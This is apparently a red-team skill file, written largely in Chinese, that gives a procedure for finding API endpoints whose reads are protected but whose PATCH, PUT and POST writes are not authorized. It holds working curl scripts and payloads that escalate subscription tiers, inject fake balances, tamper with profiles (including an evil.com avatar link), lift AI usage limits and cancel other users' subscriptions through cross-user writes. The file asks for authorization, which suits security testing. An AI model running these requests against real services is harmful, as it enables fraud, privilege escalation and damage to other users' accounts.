---
name: hunt-write-gap
description: "猎取读操作受保护、写操作存在缺口的端点：GET 受保护，而 PATCH/POST/DELETE 未做授权校验。与技术栈无关：Supabase、Firebase、REST、GraphQL。"
version: 1.1.0
revision_date: 2026-07-25
license: MIT
platforms: [linux]
metadata:
  tags: [write-gap, hunt, redteam]
  category: redteam
---

## When to Use

你已获得对目标的认证访问，能够读取（READ）自己的数据（个人资料、设置、记录），但需要测试是否能够修改（MODIFY）超出自身授权级别的数据。这是 Supabase 驱动的 SaaS 中最常见的模式，并且在 Firebase、自定义 REST API 和 GraphQL 后端中越来越普遍。

**该模式**：`GET /resource` 只返回你的数据（RLS/鉴权正常工作）。`PATCH /resource` 却允许你修改任何内容，包括套餐等级、角色、余额和订阅状态。

---

## Prerequisites

- 针对目标的明确授权、目标边界和速率限制。
- 工具：`curl`。
- 可写的证据目录：`export OUTPUT_DIR="${OUTPUT_DIR:-./output}" && mkdir -p "$OUTPUT_DIR"`。
- 对于任何改变状态的步骤（写入、上传、凭据尝试），在执行命令前立即取得明确确认。

## How to Run

```bash
TARGET="https://api.target.com"
TOKEN="<your_auth_token>"

# Test common write methods on all discovered endpoints
for ep in users subscribers profiles accounts settings; do
  for method in PATCH PUT POST; do
    code=$(curl --max-time 30 --connect-timeout 10 -sk -X "$method" -w "%{http_code}" -o /tmp/resp.txt \
      "${TARGET}/${ep}" \
      -H "Authorization: Bearer ${TOKEN}" \
      -H "Content-Type: application/json" -d '{}' 2>/dev/null)
    if [ "$code" != "404" ] && [ "$code" != "405" ]; then
      echo "  $method /${ep}: HTTP $code"
    fi
  done
done
```

## Procedure

以下各阶段即为操作流程。保持每次探测有界（`--max-time`），在 `OUTPUT_DIR` 下记录证据，并在 Pitfalls 中列出的停止条件处停止。

## 阶段 1 —— 识别可写端点

基于先前的侦察（schema 枚举、JS 包分析），构建一个接受写方法的端点列表：

```bash
TARGET="https://api.target.com"
TOKEN="<your_auth_token>"

# Test common write methods on all discovered endpoints
for ep in users subscribers profiles accounts settings; do
  for method in PATCH PUT POST; do
    code=$(curl --max-time 30 --connect-timeout 10 -sk -X "$method" -w "%{http_code}" -o /tmp/resp.txt \
      "${TARGET}/${ep}" \
      -H "Authorization: Bearer ${TOKEN}" \
      -H "Content-Type: application/json" -d '{}' 2>/dev/null)
    if [ "$code" != "404" ] && [ "$code" != "405" ]; then
      echo "  $method /${ep}: HTTP $code"
    fi
  done
done
```

返回 200/400 表示该端点存在且接受写入。404 表示端点不存在。405 表示方法错误。

---

## 阶段 2 —— 测试写操作

对每个已确认的可写端点，测试是否能够修改特权字段：

```bash
# Tier/role escalation
curl --max-time 30 --connect-timeout 10 -sk -X PATCH "${TARGET}/subscribers?user_id=eq.${USER_ID}" \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"tier_id":"<PRO_TIER_ID>","subscribed":true}'

# Balance manipulation
curl --max-time 30 --connect-timeout 10 -sk -X POST "${TARGET}/movements" \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"name":"test","amount":999999,"type":"income"}'

# Profile tampering
curl --max-time 30 --connect-timeout 10 -sk -X PATCH "${TARGET}/profiles?user_id=eq.${USER_ID}" \
  -H "Authorization: Bearer ${TOKEN}" \
  -d '{"full_name":"HACKED","avatar_url":"https://evil.com/pwned.png"}'

# AI/rate limits bypass
curl --max-time 30 --connect-timeout 10 -sk -X PATCH "${TARGET}/ai_usage_limits?user_id=eq.${USER_ID}" \
  -H "Authorization: Bearer ${TOKEN}" \
  -d '{"document_analysis_limit":99999}'
```

---

## 阶段 3 —— 测试跨用户写入（IDOR 写）

在确认自己的数据可写之后，测试是否能够修改其他用户的数据：

```bash
# Try to write with a filter targeting other users
curl --max-time 30 --connect-timeout 10 -sk -X PATCH "${TARGET}/subscribers?user_id=neq.${MY_USER_ID}" \
  -H "Authorization: Bearer ${TOKEN}" \
  -d '{"subscribed":false}'  # Try to cancel others' subscriptions

# Response: [] (empty = RLS blocked cross-user write — GOOD)
# Response: [{...}] (data returned = RLS MISSING for cross-user write — CRITICAL)
```

---

## 字段已确认的模式

| 模式 | 端点 | 影响 |
|---------|----------|--------|
| 套餐升级 | `PATCH /subscribers` | 免费 → Pro，终身订阅 |
| 余额注入 | `POST /movements` | 伪造收入，污染分析数据 |
| 个人资料劫持 | `PATCH /profiles` | 姓名/头像被改，可作钓鱼载体 |
| AI 限额绕过 | `PATCH /ai_usage_limits` | 无限 AI 处理 |
| 移除速率限制 | `PATCH /rate_limits` | 绕过所有用量配额 |
| 配置篡改 | `PATCH /settings` | 修改全局应用配置 |

---

## Pitfalls

- **返回 200/204 但未持久化** —— API 接受了写入却静默丢弃（RLS、触发器、只读副本延迟）。用 GET 读取同一资源并检查唯一标记值来确认。
- **写入 0 行** —— 过滤器未匹配任何行的 PATCH 会返回成功但不改变状态。这只能证明路由存在，不能证明存在写入缺口。
- **将自身数据写入报告为跨租户** —— 写入自己的记录属于预期行为。该发现要求能够写入其他用户或租户的对象。
- **需要 CSRF/会话前提的未认证写入** —— 如果同一请求在全新客户端上失败，请记录该前提条件，而不是声称开放访问。
- **破坏性确认** —— 对共享或生产数据执行 PATCH/DELETE 需要明确授权，并使用可恢复的合成对象。确认后清理探测记录。

---

## Verification

- **确认的写入缺口**：PATCH/POST 返回 200 且响应体包含被修改的数据。通过 GET 同一资源进行验证。
- **受保护**：返回 401/403，或静默丢弃未授权字段。
- **误报**：端点接受请求但实际未持久化变更（通过 GET 验证）。

---

## 下一步

- 若确认为写入缺口 → 报告为严重（权限提升 + 业务逻辑绕过）
- 若跨用户写入成功 → 报告为严重（IDOR 写 = 接管所有用户的账户）
- 若仅自身数据可写 → 查看 `hunt-business-logic` 评估自我修改带来的经济影响

---
